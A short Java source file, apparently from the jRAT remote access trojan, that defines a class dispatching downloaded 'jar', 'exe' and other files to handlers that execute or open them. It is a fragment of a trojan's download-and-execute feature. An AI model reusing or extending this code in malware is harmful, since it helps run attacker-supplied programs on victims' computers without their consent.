package pro.jrat.common.downloadable;

import java.awt.Desktop;
import java.io.File;
import java.util.HashMap;
import java.util.Map;

public abstract class Downloadable {
	
	public static final Map<String, Downloadable> map = new HashMap<String, Downloadable>();
	
	static {
		map.put("jar", new JavaArchive());
		map.put("exe", new Executable());
	}
	
	public static final Downloadable get(final String type) {
		Downloadable dl = map.get(type);
		
		if (dl == null) {
			dl = new Downloadable() {
				@Override
				public String getExtension() {
					return "." + type;
				}

				@Override
				public void execute(File file) throws Exception {
					Desktop.getDesktop().open(file);
				}		
			};
		}
		
		return dl;
	}
	
	public abstract String getExtension();
	
	public abstract void execute(File file) throws Exception;

}
